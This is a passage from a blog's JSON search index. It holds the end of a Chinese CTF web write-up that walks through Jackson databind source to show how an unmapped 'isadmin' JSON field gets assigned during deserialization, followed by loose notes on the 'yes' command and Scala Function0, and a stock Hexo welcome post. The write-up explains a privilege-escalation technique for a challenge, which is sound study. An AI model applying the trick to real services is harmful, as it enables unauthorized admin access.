END_OBJECT, so:\n       Object bean;\n       try &#123;\n           bean = creator.build(ctxt, buffer);\n       &#125; catch (Exception e) &#123;\n           wrapInstantiationProblem(e, ctxt);\n           bean = null; // never gets here\n       &#125;\n       // 13-Apr-2020, tatu: [databind#2678] need to handle injection here\n       if (_injectables != null) &#123;\n           injectValues(ctxt, bean);\n       &#125;\n\n       if (referrings != null) &#123;\n           for (BeanReferring referring : referrings) &#123;\n              referring.setBean(bean);\n           &#125;\n       &#125;\n       if (unknown != null) &#123;\n           // polymorphic?\n           if (bean.getClass() != _beanType.getRawClass()) &#123; // lgtm [java/dereferenced-value-may-be-null]\n               return handlePolymorphic(null, ctxt, bean, unknown);\n           &#125;\n           // no, just some extra unknown properties\n           return handleUnknownProperties(ctxt, bean, unknown);\n       &#125;\n       return bean;\n   &#125;\n\n\n\n  此时value&#x3D;true\n\n这里会根据属性值构造对象\n具体来说，createFromObjectWith() 方法的作用是使用给定的值来创建 Java 对象的实例，并返回创建好的对象。如果创建过程中出现了异常，则会抛出相应的异常。\n\n\n\n这里的newInstance，就是在调用下面这个类，对属性进行赋值\n\n\n最最最关键的点\n\n代码执行到这行的时候，因为isadmin并没有指定映射，所以他认为是&quot;&quot;\n\n\n\n所以在执行findCreatorProperty的时候，是有返回值的\n\n\n\n因此，creatorProp不是null，会跳过if，从而有了后面的赋值，如果我把json中的&quot;&quot;改为aa，那么creatorProp == null，因此就不会赋值\n\n\n生成payload“yes” 是一个Linux和Unix操作系统上的命令行工具，它会不断地输出指定的字符串或者默认的 “y” 字符串（表示 “yes”），直到被强制终止。这个命令通常用于自动化脚本中，以便在需要用户交互时自动回答 “yes”。\n例如，如果你运行以下命令：\nyes\n\n它将会不断输出 “y” 字符串，直到你使用 “Ctrl + C” 组合键强制终止。\n你还可以在 “yes” 命令后面指定一个字符串作为参数，以便输出指定的字符串。例如，如果你想输出 “hello” 字符串，你可以运行以下命令：\nyes hello\n\n这将会不断输出 “hello” 字符串，直到你使用 “Ctrl + C” 组合键强制终止。\n在 Scala 编程语言中，”Function0” 是一个函数类型，表示一个无参函数。”Object” 是 Scala 中定义所有类的根类型，因此 “Function0“ 表示一个返回类型为 “Object” 的无参函数类型。具体来说，”Function0” 是一个 Scala 标准库中预定义的函数类型，它是一个 trait（类似于 Java 中的接口），定义了一个名为 “apply” 的方法，该方法接受无参数并返回一个任意类型的值。因此，”Function0” 可以表示任何返回类型为 “Object” 的无参函数类型。在 Scala 中，函数类型可以像任何其他类型一样被作为参数传递给函数、被赋值给变量、被用作函数的返回类型等。因此，”Function0“ 可以被用作一个函数参数类型或者函数返回类型，表示一个返回类型为 “Object” 的无参函数。例如，下面的代码定义了一个名为 “f” 的函数，它接受一个类型为 “Function0“ 的参数，并调用该参数表示的函数：\ndef f(func: Function0[Object]): Unit &#x3D; &#123;\n  val result &#x3D; func()\n  println(result)\n&#125;\n\n在这个例子中，”f” 函数接受一个类型为 “Function0“ 的函数作为参数，并调用它来获取一个返回类型为 “Object” 的结果。这个函数类型可以是任何返回类型为 “Object” 的无参函数类型，例如：scalaCopy\nval func1: Function0[String] &#x3D; () &#x3D;&gt; &quot;Hello, world!&quot;\nval func2: Function0[Int] &#x3D; () &#x3D;&gt; 42\nval func3: Function0[Object] &#x3D; () &#x3D;&gt; new java.util.Date()\nf(func1) &#x2F;&#x2F; 打印 &quot;Hello, world!&quot;\nf(func2) &#x2F;&#x2F; 打印 &quot;42&quot;\nf(func3) &#x2F;&#x2F; 打印当前时间\n\nSCTF an4er_monitor","slug":"SCTF","date":"2023-07-31T12:34:40.000Z","categories_index":"","tags_index":"CTF, Web","author_index":"XyM4ster"},{"id":"b9663f58f18133b35bfe243f3e916a80","title":"Hello World","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new \"My New Post\"\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n","slug":"hello-world","date":"2023-07-31T10:26:00.671Z","categories_index":"","tags_index":"","author_index":"XyM4ster"}]